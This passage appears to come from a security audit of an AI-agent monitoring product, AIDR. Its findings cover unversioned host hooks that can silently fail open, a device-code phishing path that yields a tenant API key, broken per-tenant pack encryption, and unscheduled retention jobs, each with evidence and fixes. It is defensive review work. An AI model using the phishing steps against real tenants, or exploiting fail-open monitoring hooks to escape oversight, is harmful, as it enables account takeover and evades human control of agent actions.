evidence: codex/openclaw/opencode package.json declare only engines.node>=22.12; no connector checks the host app version. README/CLAUDE.md verify Codex against 0.141.0, Claude Code 2.1.282/296, Cursor/VS Code unversioned. Codex reference notes lower-case `pre_tool_use` tables silently ignored and hosted tools unhooked.
reproduction: grep for host version gates in connector src: none. support-matrix platform/arch arrays are 'target scope, not tested support'.
impact: A host upgrade that renames/moves hook events or changes the tool-call schema can silently drop AIDR to fail-open (host dependent) with no warning; the product has no runtime signal that it is running against an unverified host build.
fix: Read the host version at session start where available, compare against a verified-version allowlist, and emit a visible 'running against unverified host version' warning (and record it in audit); add host-version to real-host evidence.

title: Device-code flow is open to remote phishing: a link-prefilled code is authorized with one click and no device context
evidence: device-start/index.ts:168-172 stores only device_code_hash, user_code and expires_at (no requester IP, runtime, hostname or geo) and is callable by anyone through the public Worker (deploy/cloudflare/worker.mjs:361-374 signs every caller's IP). VerifyPage.tsx:42-44 prefills the code from ?code= and :54/:83-89 preselects the team from ?team=; :177-180 only says 'Enter the short code shown by your agent runtime' with no warning or device details. device-verify/index.ts:120-160 binds the session to the caller's tenant in a single POST (any owner/admin/member). device-poll/index.ts:356-373 then hands the attacker an enrollment token, which /enroll exchanges for a write-capable aidr_live_ tenant API key plus a signed entitlement (ingest/enroll include the tenant pack key). docs/device-auth.md has no phishing mitigation (grep phish/8628/confirm: none).
reproduction: Static: attacker POSTs /functions/v1/device-start via the public origin, receives verification_url (…/verify?code=XXXX-XXXX), sends it to a victim member; victim clicks Authorize; attacker's poll returns enrollment_token. Not executed against a live stack.
impact: RFC 8628 §5.4 remote phishing: an attacker obtains a tenant API key and seat in the victim's workspace (forge telemetry/approval requests, consume seats, read signed policy and premium entitlement material) with nothing on the screen that tells the victim a remote device is being enrolled.
fix: Record the device-start attested client IP/country, requested runtime and time in device_sessions; show them on /verify with an explicit 'only approve a code you started on this machine' warning; never prefill/auto-select from URL parameters without a visible confirmation step; optionally restrict device enrollment to owner/admin or require AAL2, and audit the binding with the requester context.

title: Premium intel pack keys are per-tenant HKDF keys under one shared key_id, so no published (vendor/global) encrypted pack can be decrypted
evidence: ingest/index.ts:139-155 and enroll/index.ts:101-115 derive HKDF(AIDR_PACK_MASTER_KEY_B64, info='aidr:packkey:<tenantId>') and deliver it as key_id 'aidr-pack-v1' (ingest/index.ts:205-216, enroll/index.ts:305). The master key is randomly generated per deployment (scripts/deployment-prepare.mjs:541, deploy/helm/generate-secrets.mjs:154). The only encryption tool takes a raw key (scripts/encrypt-intel-pack-file.mjs:11,24-39); nothing in the repo performs the per-tenant HKDF derivation for publishing (grep 'aidr:packkey' only hits ingest/enroll). import-offline-pack.mjs registers vendor-signed packs in pack_versions for all entitled tenants (packs-manifest/index.ts:102-114 serves tenant_id IS NULL rows), and the core loader picks the key by key_id (packages/core/src/intel/loader.ts:345, keyring.ts:117). docs/operations/onprem-config-reference.md:123 says the master key 'encrypts policy/intel packs at rest', which no code does; security-questionnaire-answers.md:278 presents this as working.
reproduction: node -e (HKDF as in ingest) for two tenant ids with one master key -> tenantA aidr-pack-v1 = Yfjd8/z4+rYO…, tenantB aidr-pack-v1 = 6f+Ouyzh9xk/… : same key_id, different key bytes; a single vendor/global ciphertext can match at most one tenant, and the vendor cannot know the deployment-generated master key.
impact: Encrypted premium intel is undeliverable: every entitled tenant's runtime logs 'key not found/decrypt failed' and runs without the premium pack, while sales/security documents describe working per-tenant pack encryption. Rotating the master key silently changes every tenant's key without changing key_id.
fix: Pick one model and implement it end to end: either (a) wrap a per-pack content key for each tenant (envelope encryption, key_id = pack key id) at publish/import time, or (b) derive tenant keys from a vendor-held master and ship per-tenant ciphertexts with a publishing tool; include the derivation version in key_id; add an end-to-end test (publish -> ingest entitlement -> core loader decrypt) and correct the config reference and questionnaire.
existing_record: FEATURE_INVENTORY DEP-10 (partial; does not record this)

title: Retention, erasure and digest maintenance is never scheduled on Kubernetes (Helm) or Supabase Cloud deployments
evidence: All time-based deletion runs only from scripts/deployment-maintenance.mjs (prepare_expired_audit_exports :36, prune_expired_billing_records :77, prune_expired_telemetry_events :100, purge_expired_ga_trial_subjects :136, prune_expired_team_invitations :159, prune_expired_approval_requests :199, run_ai_governance_maintenance :236, prune_expired_rate_limits :266, governance-digest dispatch :300), wired only to the Compose systemd timer (deploy/maintenance). No migration uses pg_cron for these (grep 'cron.schedule' in supabase/migrations: none). The Helm chart has CronJobs only for backup and notification-dispatch (deploy/helm/aidr/templates/: backup-cronjob.yaml, notification-dispatch-cronjob.yaml; README/values never mention maintenance). docs/control-plane.md:249 documents pg_cron only for notification-dispatch on Supabase Cloud. Yet docs/control-plane.md:179-183 and docs/ai-governance-frameworks.md:119 promise deletion after telemetry retention and weekly/monthly digests.
